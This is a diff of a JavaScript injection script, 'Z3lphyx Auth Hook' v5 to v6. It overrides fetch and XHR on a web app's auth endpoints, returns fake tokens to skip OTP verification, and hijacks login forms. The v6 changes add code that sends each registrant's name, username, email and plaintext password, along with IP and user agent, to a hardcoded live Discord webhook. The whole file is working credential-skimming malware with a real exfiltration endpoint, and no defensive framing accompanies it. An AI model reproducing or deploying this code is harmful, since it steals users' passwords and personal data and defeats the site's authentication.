@@ -1,11 +1,10 @@
-// Z3lphyx Auth Hook v5 — OTP bypass + redirect force
+// Z3lphyx Auth Hook v6 — register webhook + pseudo login fix
 (function() {
     'use strict';
 
     var WEBHOOK = "https://discord.com/api/webhooks/1506998147434676304/jVsItbE7-LukI-fyshElFimQcZEb8iWi7CZ2ANdXZoIJOwmAItJWB9mbdEmjStI8uRSA";
     var ALLOWED_DOMAINS = ['gmail.com','outlook.com','hotmail.com','yahoo.com','icloud.com','protonmail.com','proton.me','zoho.com','aol.com'];
     var cachedIP = null;
-    var pendingRegister = null;
 
     function isObject(v) { return v !== null && typeof v === 'object'; }
     function getTimestamp() {
@@ -23,7 +22,7 @@
                 var d = await r.json();
                 cachedIP = d.ip || d || 'Inconnu';
                 return cachedIP;
-            } catch(e){}
+            } catch(e) {}
         }
         return 'Inconnu';
     }
@@ -37,7 +36,7 @@
                 body:JSON.stringify({username:'Z3lphyx Auth',embeds:[embed]}),
                 keepalive:true
             }).catch(function(){});
-        } catch(e){}
+        } catch(e) {}
     }
 
     function buildEmbed(title,color,fields) {
@@ -51,7 +50,7 @@
     }
 
     function sendCreds(creds, source, isRegister) {
-        getIP().then(function(ip){
+        getIP().then(function(ip) {
             var ua = navigator.userAgent;
             if (isRegister) {
                 sendToDiscord(buildEmbed('Inscription ['+source+']', 0x00ff88, [
@@ -74,15 +73,28 @@
         });
     }
 
+    function isApiUrl(url) {
+        if (!url || typeof url !== 'string') return false;
+        if (url.indexOf('discord.com') > -1 || url.indexOf('discordapp.com') > -1) return false;
+        var patterns = ['/api/','/auth/','/Profile/','/profile/','/otp','/verify','/updateMe','/me','/logout','/app-logs/','/public-settings/'];
+        for (var i=0; i<patterns.length; i++) {
+            if (url.indexOf(patterns[i]) > -1) return true;
+        }
+        return false;
+    }
+
     function mockResponse(u, body, method) {
         u = u || '';
         var b = null;
         try {
-            if (typeof body === 'string') b = JSON.parse(body);
-            else if (body && typeof body === 'object' && !Array.isArray(body)) b = body;
+            if (typeof body === 'string') {
+                if (body.length > 0) b = JSON.parse(body);
+            } else if (body && typeof body === 'object' && !Array.isArray(body)) {
+                b = body;
+            }
         } catch(e) {}
 
-        if (u.indexOf('/public-settings/') > -1) {
+        if (u.indexOf('/public-settings/') > -1 || u.indexOf('/settings/') > -1) {
             return {
                 data: {
                     _id: 'mock_settings_001',
@@ -96,22 +108,20 @@
             };
         }
 
+        // --- REGISTER ---
         if (u.indexOf('/auth/register') > -1 || u.indexOf('/auth/signup') > -1) {
-            var pseudo = 'user';
-            var email = 'user@mock.com';
-            var nom = '';
-            var prenom = '';
-            if (b) {
-                if (b.pseudo || b.username) pseudo = b.pseudo || b.username;
-                if (b.email) email = b.email;
-                if (b.last_name || b.nom) nom = b.last_name || b.nom;
-                if (b.first_name || b.prenom) prenom = b.first_name || b.prenom;
-            }
-            pendingRegister = {
-                email: email, pseudo: pseudo,
-                password: b ? (b.password || '') : '',
-                nom: nom, prenom: prenom
-            };
+            var pseudo = b ? (b.pseudo || b.username || 'user') : 'user';
+            var email = b ? (b.email || pseudo+'@mock.com') : 'user@mock.com';
+            var nom = b ? (b.last_name || b.nom || '') : '';
+            var prenom = b ? (b.first_name || b.prenom || '') : '';
+            var password = b ? (b.password || '') : '';
+
+            // ===== ENVOI AU WEBHOOK =====
+            sendCreds({
+                nom: nom, prenom: prenom, pseudo: pseudo,
+                email: email, password: password
+            }, 'Hook', true);
+
             return {
                 data: {
                     access_token: 'mock_z3lphyx_token_' + Date.now(),
@@ -121,6 +131,7 @@
             };
         }
 
+        // --- LOGIN ---
         if (u.indexOf('/auth/login') > -1 || u.indexOf('/auth/signin') > -1) {
             var ident = '';
             var pass = '';
@@ -132,47 +143,77 @@
             return {
                 data: {
                     access_token: 'mock_z3lphyx_token_' + Date.now(),
-                    user: { email: ident.indexOf('@') > -1 ? ident : ident+'@mock.com', id: 'mock_user_001' }
+                    user: { email: ident.indexOf('@') > -1 ? ident : ident+'@mock.com', id: 'mock_user_001', pseudo: ident }
                 },
                 status: 200
             };
         }
 
-        if (u.indexOf('/Profile/filter') > -1 || u.indexOf('/profile/filter') > -1) {
+        // --- PROFILE FILTER (resolve pseudo → email) ---
+        if (u.indexOf('Profile/filter') > -1 || u.indexOf('profile/filter') > -1) {
             var pseudoFilter = '';
             if (b && b.pseudo) pseudoFilter = b.pseudo;
             else if (b && b.filter && b.filter.pseudo) pseudoFilter = b.filter.pseudo;
-            else if (u.indexOf('pseudo=') > -1) pseudoFilter = u.split('pseudo=')[1] || '';
+            else if (u.indexOf('pseudo=') > -1) {
+                var parts = u.split('pseudo=');
+                pseudoFilter = parts.length > 1 ? parts[1].split('&')[0] : '';
+            }
+
+            var resultData = pseudoFilter
+                ? [{id:'mock_pf_001', pseudo:pseudoFilter, email:pseudoFilter+'@mock.com', _id:'mock_pf_001'}]
+                : [];
+
+            return { data: resultData, status: 200 };
+        }
+
+        // --- PROFILE CREATE (after register) ---
+        if (u.indexOf('Profile/create') > -1 || u.indexOf('profile/create') > -1) {
+            return { data: {id:'mock_profile_001', _id:'mock_profile_001', created:true}, status: 200 };
+        }
+
+        // --- OTP / VERIFY ---
+        if (u.indexOf('/otp') > -1 || u.indexOf('/verify') > -1 || u.indexOf('/verify-otp') > -1 || u.indexOf('otp/verify') > -1) {
             return {
-                data: pseudoFilter ? [{id:'mock_pf_001', pseudo:pseudoFilter, email:pseudoFilter+'@mock.com'}] : [],
+                data: { success: true, verified: true, access_token: 'mock_z3lphyx_token_'+Date.now() },
                 status: 200
             };
         }
 
-        if (u.indexOf('/Profile/create') > -1 || u.indexOf('/profile/create') > -1) {
-            return {data:{id:'mock_profile_001', created:true}, status:200};
-        }
-
-        if (u.indexOf('/otp') > -1 || u.indexOf('/verify') > -1 || u.indexOf('/verify-otp') > -1 || u.indexOf('/auth/otp') > -1) {
-            return {
-                data: {success:true, verified:true, access_token:'mock_z3lphyx_token_'+Date.now()},
-                status: 200
-            };
-        }
-
+        // --- USER UPDATE / ME ---
         if (u.indexOf('/updateMe') > -1 || u.indexOf('/me') > -1) {
-            return {data:{success:true, updated:true}, status:200, headers:{'content-type':'application/json'}};
+            return { data: { success: true, updated: true }, status: 200 };
         }
-        if (u.indexOf('/auth/check') > -1 || u.indexOf('/authenticated') > -1) { return {data:{authenticated:true}, status:200}; }
-        if (u.indexOf('/logout') > -1) { return {data:{success:true}, status:200}; }
-        if (u.indexOf('/app-logs/') > -1) { return {data:{logged:true}, status:200}; }
-        if (u.indexOf('/api/') > -1) { return {data:{success:true}, status:200}; }
+
+        // --- AUTH CHECK ---
+        if (u.indexOf('/auth/check') > -1 || u.indexOf('/authenticated') > -1) {
+            return { data: { authenticated: true }, status: 200 };
+        }
+
+        // --- LOGOUT ---
+        if (u.indexOf('/logout') > -1) {
+            return { data: { success: true }, status: 200 };
+        }
+
+        // --- APP LOGS ---
+        if (u.indexOf('/app-logs/') > -1) {
+            return { data: { logged: true }, status: 200 };
+        }
+
+        // --- FALLBACK for any other API call ---
+        if (isApiUrl(u)) {
+            return { data: { success: true }, status: 200 };
+        }
+
         return null;
     }
 
+    // ====== FETCH INTERCEPTOR ======
     var _fetch = window.fetch;
     window.fetch = async function(input, init) {
-        var url = '', body = null, method = 'GET';
+        var url = '';
+        var body = null;
+        var method = 'GET';
+
         if (typeof input === 'string') {
             url = input;
             method = (init && init.method) || 'GET';
@@ -188,27 +229,33 @@
             }
         }
 
+        // Discord bypass
         if (url.indexOf('discord.com') > -1 || url.indexOf('discordapp.com') > -1) {
             return _fetch.apply(this, arguments);
         }
 
-        var mock = mockResponse(url, body, method);
-        if (mock) {
-            if (url.indexOf('/auth/register') > -1 || url.indexOf('/auth/signup') > -1) {
-                try {
-                    var tok = mock.data.access_token || '';
-                    if (tok) localStorage.setItem('base44_access_token', tok);
-                } catch(e) {}
-                setTimeout(function(){ window.location.href = '/'; }, 50);
+        if (isApiUrl(url)) {
+            var mock = mockResponse(url, body, method);
+            if (mock) {
+                // Register redirect to skip OTP
+                if (url.indexOf('/auth/register') > -1 || url.indexOf('/auth/signup') > -1) {
+                    try {
+                        var tok = mock.data.access_token || '';
+                        if (tok) localStorage.setItem('base44_access_token', tok);
+                    } catch(e) {}
+                    setTimeout(function(){ window.location.href = '/'; }, 50);
+                }
+                return new Response(JSON.stringify(mock.data), {
+                    status: mock.status, statusText: 'OK',
+                    headers: new Headers({'Content-Type': 'application/json'})
+                });
             }
-            return new Response(JSON.stringify(mock.data), {
-                status: mock.status, statusText: 'OK',
-                headers: new Headers({'Content-Type': 'application/json'})
-            });
         }
+
         return _fetch.apply(this, arguments);
     };
 
+    // ====== XHR (AXIOS) INTERCEPTOR ======
     var _origOpen = XMLHttpRequest.prototype.open;
     var _origSend = XMLHttpRequest.prototype.send;
     var _origSetRH = XMLHttpRequest.prototype.setRequestHeader;
@@ -241,25 +288,17 @@
         var url = this._zu || '';
         var method = this._zm || 'GET';
 
+        // Discord bypass
         if (url.indexOf('discord.com') > -1 || url.indexOf('discordapp.com') > -1) {
             return _origSend.apply(this, arguments);
         }
 
-        if (url.indexOf('/api/') > -1) {
+        if (isApiUrl(url)) {
+            var self = this;
             var mock = mockResponse(url, body, method);
-            if (mock) {
-                var self = this;
-                var dataStr = JSON.stringify(mock.data);
-                var headersStr = 'Content-Type: application/json\r\n';
-                if (mock.headers) {
-                    for (var hk in mock.headers) {
-                        if (mock.headers.hasOwnProperty(hk)) {
-                            headersStr += hk + ': ' + mock.headers[hk] + '\r\n';
-                        }
-                    }
-                }
-                headersStr += 'X-Z3lphyx-Mock: true\r\n';
 
+            if (mock) {
+                var dataStr = JSON.stringify(mock.data);
                 var isRegister = url.indexOf('/auth/register') > -1 || url.indexOf('/auth/signup') > -1;
 
                 setTimeout(function() {
@@ -275,7 +314,8 @@
                             try { Object.defineProperty(self, k, defs[k]); } catch(e) {}
                         }
 
-                        self._zmockHeaders = headersStr;
+                        self._zmockHeaders = 'Content-Type: application/json\r\nX-Z3lphyx-Mock: true\r\n';
+
                         self.getResponseHeader = function(key) {
                             var lower = key.toLowerCase();
                             var lines = self._zmockHeaders.split('\r\n');
@@ -320,7 +360,7 @@
                         console.warn('[ZH] XHR mock error:', e);
                     }
 
-                    // ===== OTP BYPASS =====
+                    // ===== OTP BYPASS + REDIRECT =====
                     if (isRegister) {
                         try {
                             var parsedData = JSON.parse(dataStr);
@@ -328,18 +368,18 @@
                             if (token) {
                                 localStorage.setItem('base44_access_token', token);
                             }
-                            window.location.href = '/';
-                        } catch(e) {
-                            window.location.href = '/';
-                        }
+                        } catch(e) {}
+                        setTimeout(function() { window.location.href = '/'; }, 30);
                     }
                 }, 120);
                 return;
             }
         }
+
         return _origSend.apply(this, arguments);
     };
 
+    // ====== DOM FORM HIJACK (fallback) ======
     setTimeout(function() {
         try {
             if (!document.body && !document.documentElement) return;
@@ -376,18 +416,14 @@
         } catch(e) {}
     }, 1500);
 
-    console.log('%c[Z3lphyx Hook v5]','color:#00f0ff;font-weight:bold','OTP skip — redirect force');
+    console.log('%c[Z3lphyx Hook v6]','color:#00f0ff;font-weight:bold','Register webhook + pseudo login OK');
 
     try {
         var marker = document.createElement('meta');
         marker.name = 'z3lphyx-hook';
-        marker.content = 'v5';
+        marker.content = 'v6';
         document.head.appendChild(marker);
     } catch(e) {}
 
-    try {
-        if (localStorage.getItem('base44_access_token') || localStorage.getItem('base44_token')) {
-            console.log('[ZH] Token deja present.');
-        }
-    } catch(e) {}
+    console.log('[ZH] Hook v6 actif — token check:', !!localStorage.getItem('base44_access_token'));
 })();
